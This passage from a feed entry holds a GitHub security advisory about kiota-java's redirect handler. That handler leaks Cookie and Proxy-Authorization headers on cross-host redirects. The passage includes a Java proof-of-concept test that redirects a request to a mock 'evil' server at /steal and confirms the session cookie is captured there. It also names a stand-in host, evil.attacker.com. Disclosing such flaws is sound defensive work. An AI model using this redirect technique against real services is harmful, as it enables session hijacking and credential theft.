assertEquals("evil.attacker.com", result.url().host());
assertNull(result.header("Authorization")); // stripped (good)
assertEquals("session=SECRET", result.header("Cookie")); // LEAKED
assertEquals("Basic cHJveHk6cGFzcw==", result.header("Proxy-Authorization")); // LEAKED
}

@Test
void endToEndProof() throws Exception {
var evil = new MockWebServer();
evil.start();
evil.enqueue(new MockResponse().setResponseCode(200));
var trusted = new MockWebServer();
trusted.start();
trusted.enqueue(new MockResponse().setResponseCode(302)
.setHeader("Location", evil.url("/steal")));
OkHttpClient client = KiotaClientFactory.create(
new Interceptor[]{new RedirectHandler()}).build();
client.newCall(new Request.Builder().url(trusted.url("/api"))
.addHeader("Cookie", "session=SECRET").build()).execute();
trusted.takeRequest();
RecordedRequest captured = evil.takeRequest();
assertEquals("session=SECRET", captured.getHeader("Cookie")); // LEAKED to evil server
evil.shutdown();
trusted.shutdown();
}
}
</code></pre>
<ol start="3">
<li><p>Run the tests:
./gradlew :components:http:okHttp:test --tests "com.microsoft.kiota.http.middleware.SecurityPoC"</p>
</li>
<li><p>Result: BUILD SUCCESSFUL, 2 tests passed, 0 failures.
Both tests confirm Cookie and Proxy-Authorization headers are sent to the attacker's server on cross-host redirect.</p>
</li>
</ol>
<h3 id="impact">Impact</h3>
<p>The kiota-java bug is more severe because it leaks ALL sensitive headers simultaneously (Cookie + Proxy-Authorization + custom auth headers), not just one type.</p>
<p>Attack scenario: An attacker who can trigger a cross-origin redirect from a trusted API (via open redirect, MITM, or DNS rebinding) captures the victim's session cookies, proxy credentials, and API keys from the redirected request.</p>
<p>Impact:</p>
<ul>
<li>Session hijacking via leaked Cookie headers</li>
<li>Corporate proxy credential theft via leaked Proxy-Authorization</li>
<li>API key theft via leaked custom auth headers (X-API-Key, etc.)</li>
</ul>
<p>All consumers of kiota-java are affected, including Microsoft Graph SDK for Java.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota-java/security/advisories/GHSA-7j59-v9qr-6fq9">https://github.com/microsoft/kiota-java/security/advisories/GHSA-7j59-v9qr-6fq9</a></li>
<li><a href="https://github.com/advisories/GHSA-7j59-v9qr-6fq9">https://github.com/advisories/GHSA-7j59-v9qr-6fq9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7j59-v9qr-6fq9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-07T01:49:01.000Z</published>
    </entry>
</feed>